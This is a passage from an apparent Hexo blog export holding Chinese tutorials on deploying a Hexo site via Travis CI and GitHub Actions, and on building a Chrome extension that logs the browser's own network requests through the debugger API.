class="line">			<span class="string">&quot;https://golang.org/&quot;</span>,</span><br><span class="line">			<span class="string">&quot;https://golang.org/pkg/&quot;</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>Go</tag>
        <tag>Tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo &amp; (GithubActions | Travis CI)</title>
    <url>/2019/01/01/hexo-blog%5B0%5D/</url>
    <content><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>仓库: 就是项目文件存放的位置,如果只完成第一步,不需要私有仓库,因为现在私有仓库免费了,所以考虑用私有仓库作为你的博客内容文件,用来存一些你觉着可能会用到但是又不希望别人看到的文件.仓库的名字可以随便取,但有一个名字是有特殊含义的,就是 <code>UserName.github.io</code>, 这个往往用来作为博客域名,并且你可以为其申请免费 <code>https</code></p>
<p>CNAME: 当你不喜欢上面那个域名,就可以通过在根目录下添加该文件来作 <code>CNAME</code> 转发</p>
<p>自动化部署: 就是你觉着每次都不用改变的重复劳动, 写成脚本即可,比如博客部署流程</p>
<p>博客部署流程: 本地 <code>source</code> 目录决定内容, <code>_config.yml</code> 决定网站基本配置(如名称, 部署方式, 默认配置等), 每次 <code>hexo g</code> 将会根据  <code>source</code> 和 <code>_config.yml</code> generate 对应的网页文件, 然后 <code>hexo d</code> 将会根据 <code>config_yml</code>  的 deploy 选项进行 push </p>
<p>add, commit, push: git基本操作,不作解释</p>
<p>ACCESS_TOKEN: 上述流程明显需要脚本有操作你仓库的权限,这个权限就通过 token 的形式来授予.</p>
<p><a class="link"   href="https://www.travis-ci.com/" >Travis CI<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>: 尽量使用该网站, 而不是 travis-ci.org, 后者不知道我用的时候为啥部署不了,该网站就是提供免费帮你跑部署脚本用的</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h3><p>首先具备一个 <code>node</code> 环境和 <code>git</code> 环境，考虑到速度建议 <code>npm</code> 改成 <code>cnpm</code> ,而 <code>git</code> 可以通过改 <code>.gitconfig</code> 来走代理。</p>
<h3 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h3><h4 id="仓库及重要文件位置"><a href="#仓库及重要文件位置" class="headerlink" title="仓库及重要文件位置"></a>仓库及重要文件位置</h4><p>远程需要</p>
<ul>
<li>一个 <code>source</code> 仓库用来存放你的博客内容文件,重点注意必须有 <code>.travis.yml</code>, <code>_config.yml</code>, <code>package.json</code>  配置文件和 <code>source</code> 文件夹, 如果考虑精简该仓库可以通过添加 <code>.gitignore</code> 的方式, 以下仅供参考</li>
</ul>
  <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br><span class="line">.vscode/</span><br></pre></td></tr></table></figure></div>

<ul>
<li>一个<code>UserName.github.io</code> 来作为你的站点文件, 以及配置一个ACCESS_TOKEN提供给 Travis CI 使用. 没啥重点文件, 内容完全交给 <code>deploy</code> 来决定, 不要忘了在仓库的 <code>setting</code> 里开启 <code>https</code>, 而ACCESS_TOKEN 是在全局 <code>setting</code> 里的</li>
</ul>
<p>搭博客分两步，第一步是为了方便，本地初始化一次『可以考虑算是本地备个份』，第二部是搭建后云端同步和常用操作。</p>
<h2 id="本地初始化"><a href="#本地初始化" class="headerlink" title="本地初始化"></a>本地初始化</h2><p>本地初始化安装hexo脚手架，意思就是说安装个工具用来初始化你的博客(比如文件夹创建，配置啥的)</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">cnpm install hexo-cli -g</span><br><span class="line"><span class="comment"># 利用 cli 创建hexo项目</span></span><br><span class="line">hexo init blogName</span><br><span class="line"><span class="built_in">cd</span> blogName</span><br><span class="line"><span class="comment"># 安装 deploy 插件</span></span><br><span class="line">cnpm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></div>

<p>初始化之后重点说下关注点: </p>
<ul>
<li>一个文件_config.yml，这个文件关注两处存在，一份根目录下，一份在themes目录下: 明显就是一个配置博客，一个配置主题。</li>
<li>然后source目录下有个_post目录，这个目录用来存放写的md也就是你的博客内容.</li>
<li>最后就是public目录，因为浏览器端不能直接解析markdown，所以需要转化成 <code>jch &lt;js, css, html&gt;</code> ，这个目录就是用来存放转化后的目录。</li>
</ul>
<p>前面根目录下的config.yml就是用来配置部署博客到哪个服务器的。打开后将deploy项进行更改就好。</p>
<div class="code-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">&lt;repository</span> <span class="string">url&gt;</span></span><br><span class="line">  <span class="attr">branch:</span> [<span class="string">branch</span>]</span><br></pre></td></tr></table></figure></div>


<p>博客这样就搭建好了，以后你就可以</p>
<ol>
<li>写一个md文件放在post目录下</li>
<li>然后 <code>hexo g</code> 生成 <code>jch</code> ，<code>hexo d</code> 部署（就是将生成好的网页传到服务器端提供访问）</li>
</ol>
<h2 id="云端同步"><a href="#云端同步" class="headerlink" title="云端同步"></a>云端同步</h2><p>上面的步骤已经可以了，但是有两个贼烦的点:</p>
<ul>
<li><p>我每次写完博客都要 <code>hexo g &amp; d</code> 一下，麻烦</p>
</li>
<li><p>自己的电脑gg了就凉了，不能随时写作</p>
</li>
</ul>
<p>所以有了第二步操作: TravisCI 自动化部署，首先去用户Setting-DeveloperSetting当中申请一个有repo权限的Token，<br>该Token 将作为环境变量 ACCESS_TOKEN</p>
<div class="code-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定语言环境</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"><span class="comment"># 指定需要sudo权限</span></span><br><span class="line"><span class="attr">sudo:</span> <span class="string">required</span></span><br><span class="line"><span class="comment"># 指定node_js版本</span></span><br><span class="line"><span class="attr">node_js:</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="string">stable</span></span><br><span class="line"><span class="comment"># 指定缓存模块，可选。缓存可加快编译速度。</span></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">directories:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">node_modules</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定博客源码分支，因人而异。hexo博客源码托管在独立repo则不用设置此项</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">source</span> </span><br><span class="line"></span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">cnpm</span> <span class="string">--registry=https://registry.npm.taobao.org</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cnpm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">hexo-cli</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start: Build Lifecycle</span></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cnpm</span> <span class="string">install</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cnpm</span> <span class="string">install</span> <span class="string">hexo-deployer-git</span> <span class="string">--save</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行清缓存，生成网页操作</span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">hexo</span> <span class="string">clean</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">hexo</span> <span class="string">generate</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置git提交名，邮箱；替换真实token到_config.yml文件，最后depoy部署</span></span><br><span class="line"><span class="attr">after_script:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.name</span> <span class="string">&quot;ReZeroS&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.email</span> <span class="string">&quot;1726542850@qq.com&quot;</span></span><br><span class="line">  <span class="comment"># 替换同目录下的_config.yml文件中gh_token字符串为travis后台刚才配置的变量，注意此处sed命令用了双引号。单引号无效！</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">sed</span> <span class="string">-i</span> <span class="string">&quot;s/gh_token/$&#123;ACCESS_TOKEN&#125;/g&quot;</span> <span class="string">./_config.yml</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">hexo</span> <span class="string">deploy</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># End: Build LifeCycle</span></span><br></pre></td></tr></table></figure></div>


<p>上面的文件只有一个地方需要注意: <code>sed -i &quot;s/gh_token/$&#123;ACCESS_TOKEN&#125;/g&quot; </code>, 这句话的含义很明显就是正则替换,也就是为更改 <code>_config.yml</code> 的 <code>deploy</code> 选项做准备.</p>
<p>因为推出了github actions， 这里加一份github actions 的版本</p>
<div class="code-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">push</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-18.04</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">master</span> <span class="string">branch</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@master</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">fetch-depth:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">nodejs</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">dcodeIO/setup-node-nvm@master</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">node</span></span><br><span class="line">          <span class="attr">node-mirror:</span> <span class="string">https://nodejs.org/download/v8-canary/</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Dependency</span> <span class="string">install</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          npm install -g cnpm --registry=https://registry.npm.taobao.org</span></span><br><span class="line"><span class="string">          cnpm install -g hexo-cli</span></span><br><span class="line"><span class="string">          cnpm install</span></span><br><span class="line"><span class="string">          cnpm install</span></span><br><span class="line"><span class="string"></span>      </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Clean</span> <span class="string">And</span> <span class="string">Regenerate</span> </span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          ./node_modules/.bin/hexo clean</span></span><br><span class="line"><span class="string">          ./node_modules/.bin/hexo generate</span></span><br><span class="line"><span class="string"></span>          </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span></span><br><span class="line">        <span class="attr">env:</span> </span><br><span class="line">          <span class="attr">ACCESS_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.ACCESS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          git config --global user.name &quot;ReZeroS&quot;</span></span><br><span class="line"><span class="string">          git config --global user.email &quot;1726542850@qq.com&quot;</span></span><br><span class="line"><span class="string">          sed -i &quot;s/gh_token/$&#123;ACCESS_TOKEN&#125;/g&quot; ./_config.yml</span></span><br><span class="line"><span class="string">          ./node_modules/.bin/hexo deploy</span></span><br></pre></td></tr></table></figure></div>


<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p> 改完后 <code>push</code> 到你的私有仓库就可以了,这样每次你都可以直接 <code>浏览器端</code> 打开你的私有仓库,然后直接新建md文件, 然后你的 <code>commit</code> 记录就会被 TravisCI 监测到, 会自动触发 <code>hook</code>, 因而就 <code>push</code> 到你的博客了.</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>blog</tag>
        <tag>CI/CD</tag>
        <tag>github actions</tag>
      </tags>
  </entry>
  <entry>
    <title>如何写一个简易的chrome插件</title>
    <url>/2020/03/07/init-chrome-plugin/</url>
    <content><![CDATA[<h1 id="如何写一个简易的chrome插件"><a href="#如何写一个简易的chrome插件" class="headerlink" title="如何写一个简易的chrome插件"></a>如何写一个简易的chrome插件</h1><h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><p><a class="link"   href="https://developer.chrome.com/extensions/getstarted" >https://developer.chrome.com/extensions/getstarted<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>推荐阅读官方文档，本文只做简单的演示。</p>
<blockquote>
<p>本文图片之类链接打不开，可直接科学上网走外链，参考 <a class="link"   href="https://qqtim.club/2020/03/07/init-chrome-plugin/" >原博文<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<h2 id="概念介绍"><a href="#概念介绍" class="headerlink" title="概念介绍"></a>概念介绍</h2><h3 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h3><ol>
<li>manifest.json</li>
</ol>
<p>可以类比 <code>AndroidManifest</code>，几乎所有的项目都会有一个主配置文件，用来配置全局的基本信息和属性来保证系统的基本启动运行，该文件为 <code>chrome plugin</code> 主配置文件。<br>基于浏览器插件考虑所占体积这个特性，几乎所有关键的配置属性信息都可以在此找到，除了名称，版本等必要的信息，<br><strong>尤为值得关注的几个属性就是</strong>    </p>
<ul>
<li><code>background</code> 改配置属性决定项目启动时会去扫描哪些 js 文件,  然后以此决定需要监听的事件</li>
</ul>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;background.js&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;persistent&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>permission</code> 该属性为权限属性，这个的重要性不必多说，上面的属性注册事件监听时往往需要依赖大量的api，而这些api的权限就依赖于这个 <code>permission</code> 属性</li>
</ul>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;permissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;storage&quot;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>browser_action</code> 权限和动作都有了，剩下的显然就是渲染的模板文件了，该属性决定了回显需要的大多数配置，包括插件的图标，点击插件时显示的页面等</li>
</ul>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;browser_action&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;default_icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;icon_16.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;default_popup&quot;</span><span class="punctuation">:</span> <span class="string">&quot;popup.html&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://developer.chrome.com/static/images/overview/messagingarc.png"
                      alt="概念图"
                ></p>
<h3 id="重点注意"><a href="#重点注意" class="headerlink" title="重点注意"></a>重点注意</h3><ul>
<li><p>上面的图中可以看到，插件是基于 <code>message</code> 来互相通信的， 这个 <code>message</code> 后面再说</p>
</li>
<li><p><code>Chrome</code> 不允许将 <code>JavaScript</code> 代码段直接内嵌入HTML文档 （inline-script也是被禁止）</p>
</li>
</ul>
<blockquote>
<p>所以我们需要通过外部引入的方式引用JS文件<br>所以所有元素的事件都需要使用JavaScript代码进行绑定<br>如果你没有使用一个拥有强大选择器的库（jQuery）, 最好给需要绑定事件的元素分配一个id以便进行操作</p>
</blockquote>
<ul>
<li><p><code>&quot;manifest_version&quot;: 2</code>, 这个写 2 吧， 别问为啥</p>
</li>
<li><p><code>contentscript.js</code> 这个决定了用户所在的界面操作，emmmm， 就简单理解为通过插件隐性的操作用户的浏览界面，这个这么说明显风险很大，摆明了就是注入 js 搞事的，可以参考个例子： <a class="link"   href="https://blog.csdn.net/github_35957188/article/details/54810057" >永远点不到的百度按钮<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>  注：文章是很久以前瞎抄的图灵社区来着，可能乱七八糟的，就看个效果就行了，本文只是简单的开发，不会使用各类复杂的属性</p>
</li>
<li><p>前面提到的background 属性，有两个可能不是很必要使用的值，一个是 <code>page</code>, 这个是后台配置属性文件，一般需要构建后台页面时才需要。 而 <code>persistent</code> 属性定义了常驻后台的方式（默认为true）——当其值为true时，表示扩展将一直在后台运行，无论其是否正在工作；当其值为false时，表示扩展在后台按需运行，这就是Chrome后来提出的 Event Page, 这个说白了就是按需运行，少耗点内存，不过少耗有什么用呢，chrome嘛，大家都懂的。</p>
</li>
</ul>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="开发目标"><a href="#开发目标" class="headerlink" title="开发目标"></a>开发目标</h3><p>实现一个访问日志记录，用来记录当前浏览器发出的请求</p>
<h3 id="开发日志-项目地址"><a href="#开发日志-项目地址" class="headerlink" title="开发日志  项目地址"></a><a class="link"   href="https://qqtim.club/2020/02/06/request-record/" >开发日志<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>  <a class="link"   href="https://github.com/ReZeroS/request-record" >项目地址<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h3><ol>
<li>先从基本配置开始, 如下所示</li>
</ol>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Request Record&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Generate the request log and group them by address url&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;permissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;debugger&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;tabs&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;background.js&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;browser_action&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;default_icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;icon.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;default_title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Request Record&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;manifest_version&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>我们定义了这个插件的一些基本属性，包括它的名字，描述，版本号,申请权限（这里申请了debugger权限，因为这个权限级别比较高，可以方便开发使用，实际开发是不推荐使用的，另一个tabs权限自然就是tab页相关了）, 以及为其注册了一个后台 js 用来主监听，和默认使用的插件 <code>icon</code></p>
<blockquote>
<p>The chrome.debugger API serves as an alternate transport for Chrome’s remote debugging protocol. Use chrome.debugger to attach to one or more tabs to instrument network interaction, debug JavaScript, mutate the DOM and CSS, etc. Use the Debuggee tabId to target tabs with sendCommand and route events by tabId from onEvent callbacks.</p>
</blockquote>
<ol start="2">
<li>接下来我们在 <code>background.js</code> 中注册基本的监听器</li>
</ol>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">chrome.<span class="property">browserAction</span>.<span class="property">onClicked</span>.<span class="title function_">addListener</span>(<span class="keyword">function</span>(<span class="params">tab</span>) &#123;</span><br><span class="line">  chrome.<span class="property">debugger</span>.<span class="title function_">attach</span>(&#123;<span class="attr">tabId</span>:tab.<span class="property">id</span>&#125;, version,</span><br><span class="line">      onAttach.<span class="title function_">bind</span>(<span class="literal">null</span>, tab.<span class="property">id</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> version = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onAttach</span>(<span class="params">tabId</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (chrome.<span class="property">runtime</span>.<span class="property">lastError</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(chrome.<span class="property">runtime</span>.<span class="property">lastError</span>.<span class="property">message</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  chrome.<span class="property">windows</span>.<span class="title function_">create</span>(</span><br><span class="line">      &#123;<span class="attr">url</span>: <span class="string">&quot;headers.html?&quot;</span> + tabId, <span class="attr">type</span>: <span class="string">&quot;popup&quot;</span>, <span class="attr">width</span>: <span class="number">800</span>, <span class="attr">height</span>: <span class="number">600</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>上述使用的api都可以在文末的手册链接中找到，这里只做简单的描述，第一个 <code>browserAction.onClicked</code> 会根据你是否已经 <code>popup</code>(就是你点图标后弹出的小窗) 来决定是否触发， 这个监听器会监听到一个 tabId 从而定位目标的 <code>tab</code> 页。 </p>
</li>
<li><p>接下来使用  <code>chrome.debugger.attach</code> 使用这个将 <code>debug</code> 目标挂载上，这个 <code>attach</code> 接受三个参数, <a class="link"   href="https://developer.chrome.com/extensions/debugger#type-Debuggee" >debuggee 对象<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>， 版本号，和一个回调函数，挂载成功时会触发该回调，失败时会采用类似 <code>C</code> 的异常处理方式，也就是用全局变量去set异常记录。</p>
</li>
<li><p>我们在 <code>debugger</code> 成功挂载上目标对象后，创建我们的主页面，开始我们真正的业务代码开发</p>
</li>
</ul>
<ol start="3">
<li>业务相关</li>
</ol>
<ul>
<li>前面提到过 <code>chrome</code>, <code>chrome</code> 不允许直接将 <code>js</code> 嵌入文档，所以都是外部引入 <code>js</code> 的，我们这里不引入其他工具型 <code>js</code> 了，直接使用基本的 <code>id</code> 去锁定目标 <code>element</code> 来操作，可以看到总共使用了三部分，一个按钮，用作请求日志的导出，一个 <code>container</code>， 用做基本的渲染展示。</li>
</ul>
<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-family</span>: monospace;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">word-wrap</span>: break-word;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#container</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">white-space</span>: pre;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.request</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border-top</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;ecl&quot;</span>&gt;</span>export<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;container&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;headers.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>然后我们在 <code>header.js</code> 中，通过 <code>load event</code>， 为页面加载完成后绑定回调方法，在方法中首先使用 <code>sendCommand</code> 向目标 <code>tab</code> 页发送指令 <code>Network.enable</code> 来启用 <code>web</code> 请求 <code>tracking</code>。在此之后我们开启 <code>debugger</code> 事件监听，通过监听的第二，三个参数可以获取到大部分了想要的数据了（二三个参数分别是 <a href="https://chromedevtools.github.io/devtools-protocol/tot/Network#type-Request"><code>remote debugging protocol</code></a> 的方法名和方法参数）， 至此所有的资源都准备好了，接下来就是依赖这些资源自行进行开发了</li>
</ul>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tabId = <span class="built_in">parseInt</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;load&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  chrome.<span class="property">debugger</span>.<span class="title function_">sendCommand</span>(&#123;<span class="attr">tabId</span>:tabId&#125;, <span class="string">&quot;Network.enable&quot;</span>);</span><br><span class="line">  chrome.<span class="property">debugger</span>.<span class="property">onEvent</span>.<span class="title function_">addListener</span>(onEvent);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;unload&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  chrome.<span class="property">debugger</span>.<span class="title function_">detach</span>(&#123;<span class="attr">tabId</span>:tabId&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<ul>
<li>最后，以我写的简单小插件作为最后 onEvent 监听器样例吧，代码风格很糟，草草起手，加上我专项是后端，前端的原生 <code>js</code> 并不熟悉，所以仅仅加了注释方便参考，前面核心的地方都说了，后面这一点其实可有可无（我就是单纯的根据url进行了个前缀分类然后导出了 <code>csv</code>，而也可以按照http header的状态码（比如403， 懂的都懂）或者任意信息做个类似的），大家按自己的需求开发即可【Dev tools network 的 abilities 都有了还有啥做不出来 -_-】</li>
</ul>
